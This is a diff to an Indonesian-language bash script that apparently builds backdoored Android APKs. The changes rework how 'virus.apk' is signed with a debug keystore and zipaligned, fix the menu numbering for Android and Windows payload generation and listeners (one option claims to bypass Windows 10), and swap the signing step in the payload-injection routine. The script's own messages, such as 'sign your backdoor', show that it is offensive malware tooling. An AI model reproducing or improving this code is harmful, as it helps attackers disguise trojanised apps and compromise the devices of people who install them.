@@ -746,7 +746,7 @@ function verifikasi()
 {
  echo "[*] Verifikasi Aplikasi..."
  
- xterm -T "Verifikasi APk" -e /opt/android-sdk/build-tools/30.0.3/zipalign -v 4 virus.apk $apk_name.apk | sed -e '1,2d' | sed -e '$d'| awk '{print $2}' | sed 's@^.*$@[*] & (OK - compressed) @g'
+ xterm -T "Verifikasi APk" -e zipalign -v 4 virus.apk $apk_name.apk | sed -e '1,2d' | sed -e '$d'| awk '{print $2}' | sed 's@^.*$@[*] & (OK - compressed) @g'
 }
 # add permission dan hook
 #
@@ -834,7 +834,7 @@ function apk_comp1()
 #
 function sign_orig(){
         printf "[*] sign your backdoor...\n"
-        java -jar $path/.android/sign.jar virus.apk;mv virus.s.apk virus.apk > /dev/null 2>&1
+        java -jar $path/.android/sign.jar testkey.x509.pem testkey.pk8 virus.apk;mv virus.s.apk virus.apk > /dev/null 2>&1
         printf "[*] signed backdoor, succesfully...\n"
         sleep 0.025s
         printf "[*] verification your backdoor, please wait...\n"
@@ -842,7 +842,7 @@ function sign_orig(){
         printf "[*] recompile your backdoor...\n"
         sleep 0.025s
         #zipalign -v 4 virus.apk $apk_name.apk | sed -e '1,2d' | sed -e '$d'| awk '{print $2}' | sed 's@^.*$@[*] & (OK - compressed) @g'
-        /opt/android-sdk/build-tools/30.0.3/zipalign -v 4 virus.apk result/$apk_name.apk | sed -e '1,2d' | sed -e '$d'| awk '{print $2}' | sed 's@^.*$@[*] & (OK - compressed) @g'
+        zipalign -v 4 virus.apk result/$apk_name.apk | sed -e '1,2d' | sed -e '$d'| awk '{print $2}' | sed 's@^.*$@[*] & (OK - compressed) @g'
         rm -fr virus.apk &> /dev/null
         printf "[*] verification, succesfully... result:$path/result/$apk_name.apk"
         animate """
@@ -850,6 +850,43 @@ function sign_orig(){
 [TEKAN] enter untuk melanjutkan... 
         """
         read x
+}
+
+#function signing apk
+function sign()
+{
+ echo "[*] Checking for ~/.android/debug.keystore for signing..."
+ if [ ! -f ~/.android/debug.keystore ]; then
+     echo " [ X ] Debug key not found. Generating one now..."
+     
+     if [ ! -d "~/.android" ]; then
+       mkdir ~/.android > /dev/null 2>&1
+     fi
+     keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 
+ fi
+ 
+ echo "[*] Attempting to sign the package with your android debug key"
+ 
+ jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA virus.apk androiddebugkey > /dev/null 2>&1
+ echo "[*] Verifying signed artifacts..."
+ 
+ jarsigner -verify -certs virus.apk > /dev/null 2>&1
+ rc=$?
+ if [ $rc != 0 ]; then
+   echo "[!] Failed to verify signed artifacts"
+   exit $rc
+ fi
+ echo "[*] Aligning recompiled APK..."
+ 
+ zipalign 4 virus.apk $apk_name.apk 2>&1
+ rc=$?
+ echo "[✔] Done."
+ 
+ if [ $rc != 0 ]; then
+   echo "[!] Failed to align recompiled APK"
+   exit $rc
+ fi
+ rm virus.apk > /dev/null 2>&1
 }
 
 # Menu hacking Android
@@ -866,7 +903,7 @@ menu3() {
     [4]. Generate Payload Windows untuk Bypass Windows 10
     ----------------------------------------------
     [5]. Aktifkan Listener Payload Android
-    [5]. Aktifkan Listener Payload Windows
+    [6]. Aktifkan Listener Payload Windows
     [x]. Kembali
     ----------------------------------------------
     Interface IP:
@@ -971,7 +1008,8 @@ inject_android_payload_new() {
     perms
     hook_smalies
     apk_comp1
-    sign_orig
+    sign
+    #sign_orig
 
     sleep 2
     menu3
@@ -1070,7 +1108,7 @@ run() {
             5) menu5 ;;
             6) menu6 ;;
             7) menu7 ;;
-            x) break ;;
+            x) break;exit 1 ;;
             *) animate "Pilihan tidak valid. Harap coba lagi." ;;
         esac
     done
